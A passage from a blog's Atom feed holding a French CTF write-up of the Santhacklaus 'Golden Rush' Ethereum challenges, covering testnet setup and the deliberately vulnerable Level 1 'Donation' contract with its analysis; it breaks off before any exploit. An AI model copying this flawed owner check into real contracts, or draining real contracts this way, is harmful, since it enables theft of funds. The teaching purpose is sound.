<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

 <title>Adel ALLAM</title>
 <link href="http://localhost:4000/atom.xml" rel="self"/>
 <link href="http://localhost:4000/"/>
 <updated>2020-05-07T22:11:41+02:00</updated>
 <id>http://localhost:4000</id>
 <author>
   <name>Adel ALLAM</name>
   <email>example@example.com</email>
 </author>

 
 <entry>
   <title>santhacklaus ctf v2</title>
   <link href="http://localhost:4000/linux/2019/12/23/ctf-santhacklaus/"/>
   <updated>2019-12-23T00:00:00+01:00</updated>
   <id>http://localhost:4000/linux/2019/12/23/ctf-santhacklaus</id>
   <content type="html">&lt;!--more--&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;#golden-rush&quot;&gt;Golden Rush&lt;/a&gt;&lt;/li&gt;
    &lt;ul&gt;
        &lt;li&gt;&lt;a href=&quot;#level-1---donation&quot;&gt;Level 1 - Donation&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&quot;#level-2---piggybank&quot;&gt;Level 2 - PiggyBank&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&quot;#level-3---gringotts&quot;&gt;Level 3 - Gringotts&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&quot;#level-4---wallstreet&quot;&gt;Level 4 - WallStreet&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&quot;#level-5---thevault&quot;&gt;Level 5 - TheVault&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;golden-rush&quot;&gt;Golden Rush&lt;/h1&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;Catégorie&lt;/strong&gt;: Blockchain&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;GoldenRush is a set of challenges based on  the Ethereum Blockchain technology where you will have to exploit  vulnerable Smart Contracts. Your goal is to steal the money that I sent  on it !&lt;/p&gt;

&lt;p&gt;https://goldenrush.santhacklaus.xyz&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Auteur&lt;/strong&gt;: Ch3n4p4N&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;

&lt;h3 id=&quot;metamask&quot;&gt;MetaMask&lt;/h3&gt;

&lt;p&gt;Pour réussir les challenges, il est nécessaire d’avoir l’extension &lt;a href=&quot;https://metamask.io/&quot;&gt;MetaMask&lt;/a&gt;. Il faudra également créer un compte dans cette dernière.&lt;/p&gt;

&lt;p&gt;MetaMask est un wallet de cryptomonaie Ethereum, on va utiliser ce dernier afin de réaliser des transactions. Chaque wallet possède un identifiant, cet identifiant est une suite hexadécimale.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# par exemple&lt;/span&gt;
0x7890720F3e2bA41d7447547Dd4004ed429E944a2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Cette adresse est par exemple nécessaire lorsque 2 personnes veulent réaliser une transaction.&lt;/p&gt;

&lt;h3 id=&quot;ropsten-test-network&quot;&gt;Ropsten Test Network&lt;/h3&gt;

&lt;p&gt;Par défaut, MetaMask utilise la blockchain &lt;strong&gt;Ethereum&lt;/strong&gt; (appelé &lt;em&gt;mainnet&lt;/em&gt;), nous n’allons pas travailler sur cette dernière puisque pour réaliser des transactions, nous avons besoin d’Ethereum que nous devons acheter.&lt;/p&gt;

&lt;p&gt;Il existe alors une autre blockchain appelée &lt;strong&gt;Ropsten Test Network&lt;/strong&gt; (ou &lt;em&gt;testnet&lt;/em&gt;), cette dernière est par exemple utilisée pendant des phases de développement afin de tester du code avant la mise en production dans la mainnet. Tous les ethers (unité de cette blockchain) que l’on peut avoir n’ont aucune valeur, c’est simplement une simulation pour réaliser des tests. Il faut donc &lt;strong&gt;switcher sur le réseau Ropsten Test Network&lt;/strong&gt; sur MetaMask.&lt;/p&gt;

&lt;h3 id=&quot;remplir-son-wallet&quot;&gt;Remplir son wallet&lt;/h3&gt;

&lt;p&gt;Il faut maintenant remplir son wallet avec quelques ethers. Pour cela, on peut utiliser un &lt;a href=&quot;https://faucet.metamask.io/&quot;&gt;faucet&lt;/a&gt;. Il faut alors appuyer sur &lt;strong&gt;request 1 ether from faucet&lt;/strong&gt;, lors de la première visite, il faudra accepter de connecter son compte MetaMask au site du faucet. Récupérer 2 ou 3 Ether est suffisant pour réussir les challenges.&lt;/p&gt;

&lt;h3 id=&quot;liens-utiles&quot;&gt;Liens utiles&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://ropsten.etherscan.io/&quot;&gt;Etherscan&lt;/a&gt;: c’est un &lt;strong&gt;exploreur du réseau Ropsten&lt;/strong&gt;, il permet de suivre des transactions, des smarts contrats et des comptes, le vrai réseau Ethereum est &lt;a href=&quot;https://etherscan.io/&quot;&gt;ici&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://remix.ethereum.org/&quot;&gt;Remix&lt;/a&gt;: c’est un IDE Ethereum, ou l’on va écrire notre code en langage Solidity.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://medium.com/coinmonks/write-a-simple-contract-on-top-of-ethereum-92b543594e84&quot;&gt;Smart contract avec Remix&lt;/a&gt;: exemple d’un smart contract.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://remix-ide.readthedocs.io/en/latest/index.html&quot;&gt;Remix documentation&lt;/a&gt;: documentation.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=RHh1qSx7v6w&quot;&gt;Video de writups&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;remarques&quot;&gt;Remarques&lt;/h3&gt;

&lt;p&gt;L’interface graphique de Remix IDE ayant changé récemment, le compiler et le runner ne sont plus disponibles par défaut. Il faudra alors installer le &lt;strong&gt;Solidity compiler&lt;/strong&gt; ainsi que &lt;strong&gt;Deploy &amp;amp; run transactions&lt;/strong&gt;, pour cela, il faut utiliser le &lt;strong&gt;Plugin manager&lt;/strong&gt; pour les installer (logo d’une prise à gauche).&lt;/p&gt;

&lt;h3 id=&quot;communiquer-avec-un-smart-contract&quot;&gt;Communiquer avec un smart contract&lt;/h3&gt;

&lt;p&gt;Nous allons utiliser une &lt;strong&gt;console JavaScript&lt;/strong&gt; pour communiquer avec les smart contracts. Avant cela, il faut autoriser le domaine sur lequel on veut travailler à utiliser notre compte MetaMask. Pour cela, allez dans l’extension MetaMask, cliquer sur le cercle en haut à droite, Paramètres (ou Settings), Connections puis Connect.&lt;/p&gt;

&lt;p&gt;Lancez alors une console JavaScript. Pour tester que votre compte MetaMask est accessible:&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;web3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;eth&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;accounts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;--&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;0x7890720f3e2ba41d7447547dd4004ed429e944a2&quot;&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;me&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;web3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;eth&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;accounts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Vous devriez alors obtenir l’adresse de votre wallet MetaMask. On va definir une variable &lt;code class=&quot;highlighter-rouge&quot;&gt;me&lt;/code&gt; contenant notre adresse de wallet.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;abi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[{&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;constant&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// ABI&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;contractAddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;0x57A10FC74a52afDE6674C3DE0761ed021d4534f7&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// adresse d'instance&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;web3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;eth&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;abi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;at&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;contractAddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Sur la page du challenge, après avoir cliqué sur &lt;code class=&quot;highlighter-rouge&quot;&gt;New Instance&lt;/code&gt;et après quelques secondes, une adresse d’instance et un ABI sont fournis. La variable &lt;code class=&quot;highlighter-rouge&quot;&gt;contract&lt;/code&gt;va nous permettre de communiquer avec notre smart contract.&lt;/p&gt;

&lt;h3 id=&quot;objectif&quot;&gt;Objectif&lt;/h3&gt;

&lt;p&gt;Le but des 5 challenges est de voler les ethers de chaque contrat deployé.&lt;/p&gt;

&lt;h1 id=&quot;level-1---donation&quot;&gt;Level 1 - Donation&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;Points&lt;/strong&gt;: 100&lt;/p&gt;

&lt;hr /&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;pragma&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;solidity&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Donation&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;uint256&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;funds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  
  &lt;span class=&quot;kd&quot;&gt;constructor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;payable&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;funds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;funds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;external&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;payable&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;funds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;funds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getDonationsFromOwner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_contractOwner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;external&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;keccak256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;abi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;encodePacked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;keccak256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;abi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;encodePacked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_contractOwner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)));&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;transfer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;funds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;funds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;analyse&quot;&gt;Analyse&lt;/h2&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;pragma&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;solidity&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;La version de Solidity à utiliser pour la compilation, ici, doit être supérieur ou égale à &lt;code class=&quot;highlighter-rouge&quot;&gt;0.4.22&lt;/code&gt;et inférieur à &lt;code class=&quot;highlighter-rouge&quot;&gt;0.6.0&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Donation&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Le squelette d’un smart contract appelé &lt;code class=&quot;highlighter-rouge&quot;&gt;Donation&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;uint256&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;funds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;funds&lt;/code&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;un unsigned int de 256 bits (32 octets)&lt;/li&gt;
  &lt;li&gt;public, donc accessible depuis l’extérieur&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;constructor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;payable&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;funds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;funds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Constructeur de notre smart contract, &lt;strong&gt;appelé une et une seule fois&lt;/strong&gt; lors du déploiement sur la blockchain. Ce dernier initialise &lt;code class=&quot;highlighter-rouge&quot;&gt;funds&lt;/code&gt; à la quantité &lt;code class=&quot;highlighter-rouge&quot;&gt;msg.value&lt;/code&gt;, cette dernière est la quantité d’ether de la transaction pour le déploiement.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;ul&gt;
    &lt;li&gt;&lt;a href=&quot;https://solidity.readthedocs.io/en/v0.4.24/units-and-global-variables.html&quot;&gt;Units and Globally Available Variables&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;msg.value&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;uint&lt;/code&gt;): number of wei sent with the message.&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;external&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;payable&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;funds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;funds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;C’est la &lt;strong&gt;fallback function&lt;/strong&gt;, de ce smart contract. Une fallback function est une fonction qui n’a pas de nom, il y en a au maximum une dans un smart contract. Elle est appelée en cas d’erreur dans une transaction ou lorsque l’on envoie des ethers au contrat. Dans notre cas, elle se charge simplement d’ajouter les nouveaux fonds que l’on a envoyés dans la transaction.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getDonationsFromOwner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_contractOwner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;external&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;keccak256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;abi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;encodePacked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;keccak256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;abi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;encodePacked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_contractOwner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)));&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;transfer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;funds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;funds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Fonction qui prend une adresse en paramètre, peut être appelée de l’extérieur (&lt;code class=&quot;highlighter-rouge&quot;&gt;external&lt;/code&gt;).&lt;/p&gt;

&lt;p&gt;Informations:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;adresse(this)&lt;/code&gt;: adresse de l’instance du smart contract&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;abi.encodePacked()&lt;/code&gt;: peu importante, utilisé pour de l’encodage&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;keccack256()&lt;/code&gt;:  fonction de hachage (SHA3)&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;require(a == b)&lt;/code&gt;: condition doit être vérifiée pour continuer l’exécution du code&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;msg.sender.transfer(funds)&lt;/code&gt;: envoyer tous les &lt;code class=&quot;highlighter-rouge&quot;&gt;funds&lt;/code&gt;à l’expéditeur ( &lt;code class=&quot;highlighter-rouge&quot;&gt;msg.sender&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;msg.sender&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;address&lt;/code&gt;): sender of the message (current call)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;communiquer-avec-notre-smart-contract&quot;&gt;Communiquer avec notre smart contract&lt;/h4&gt;

